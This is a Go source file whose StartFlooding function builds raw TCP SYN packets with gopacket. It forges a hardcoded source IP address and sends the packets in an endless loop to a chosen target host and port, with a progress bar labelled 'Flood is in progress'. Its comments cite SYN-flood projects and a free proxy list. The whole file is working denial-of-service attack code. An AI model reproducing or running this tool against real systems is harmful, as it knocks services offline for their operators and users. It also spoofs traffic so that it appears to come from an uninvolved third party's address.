package raw

import (
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/schollz/progressbar/v3"
	"golang.org/x/net/ipv4"
	"net"
	"time"
)

func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
	bar := progressbar.DefaultBytes(-1, "Flood is in progress")
	payload := getRandomPayload(payloadLength)
	for {
		// https://www.programmersought.com/article/74831586115/
		// https://github.com/rootVIII/gosynflood
		// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/
		// https://github.com/kdar/gorawtcpsyn/blob/master/main.go
		// https://pkg.go.dev/github.com/google/gopacket
		// https://github.com/david415/HoneyBadger/blob/021246788e58cedf88dee75ac5dbf7ae60e12514/packetSendTest.go
		// free proxies -> https://www.sslproxies.org/

		var srcIp, dstIp net.IP
		srcIpStr := "117.58.245.110"

		srcIp = net.ParseIP(srcIpStr).To4()
		dstIp = net.ParseIP(dstIpStr).To4()

		// build raw/ip packet
		ip := &layers.IPv4{
			SrcIP: srcIp,
			DstIP: dstIp,
			//Version: 4,
			//TTL: 64,
			Protocol: layers.IPProtocolTCP,
		}
		tcp := &layers.TCP{
			SrcPort: layers.TCPPort(30500),
			DstPort: layers.TCPPort(dstPort),
			//Window:  1505,
			Window:  14600,
			// Urgent:  0,
			//Seq:     11050,
			Seq:     1105024978,
			// Ack:     0,
			SYN:     true,
		}
		err := tcp.SetNetworkLayerForChecksum(ip)
		if err != nil {
			panic(err)
		}

		// Serialize.  Note:  we only serialize the TCP layer, because the
		// socket we get with net.ListenPacket wraps our data in IPv4 packets
		// already.  We do still need the IP layer to compute checksums
		// correctly, though.
		ipHeaderBuf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		err = ip.SerializeTo(ipHeaderBuf, opts)
		if err != nil {
			panic(err)
		}
		ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
		if err != nil {
			panic(err)
		}
		tcpPayloadBuf := gopacket.NewSerializeBuffer()
		payload := gopacket.Payload(payload)
		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, tcp, payload)
		if err != nil {
			panic(err)
		}

		// XXX send packet
		var packetConn net.PacketConn
		var rawConn *ipv4.RawConn
		packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0")
		if err != nil {
			panic(err)
		}
		rawConn, err = ipv4.NewRawConn(packetConn)
		if err != nil {
			panic(err)
		}

		err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
		// log.Printf("packet of length %d sent!\n", len(tcpPayloadBuf.Bytes()) + len(ipHeaderBuf.Bytes()))
		err = bar.Add(payloadLength)
		if err != nil {
			panic(err)
		}
		time.Sleep(800 * time.Millisecond)
	}
}